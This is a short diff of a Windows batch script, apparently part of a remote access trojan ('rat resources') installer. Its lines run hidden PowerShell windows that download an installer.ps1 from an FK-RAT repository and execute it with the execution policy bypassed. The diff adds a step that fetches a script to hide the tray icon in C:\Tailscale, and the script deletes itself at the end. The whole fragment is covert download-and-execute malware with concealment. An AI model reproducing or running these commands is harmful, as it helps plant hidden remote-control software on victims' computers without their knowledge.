@@ -38,5 +38,8 @@ REM rat resources
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
 powershell -windowstyle hidden -ep bypass .\installer.ps1 
 
+REM remove Icon on sys tray
+powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/fd56aec2c8823c7600cba29e38b9913b109fbf9d/Modules/Scripts/Set-NotifyIcon.ps1 -OutFile C:\Tailscale\notify.ps1";
+
 REM self delete
 del wget.cmd 
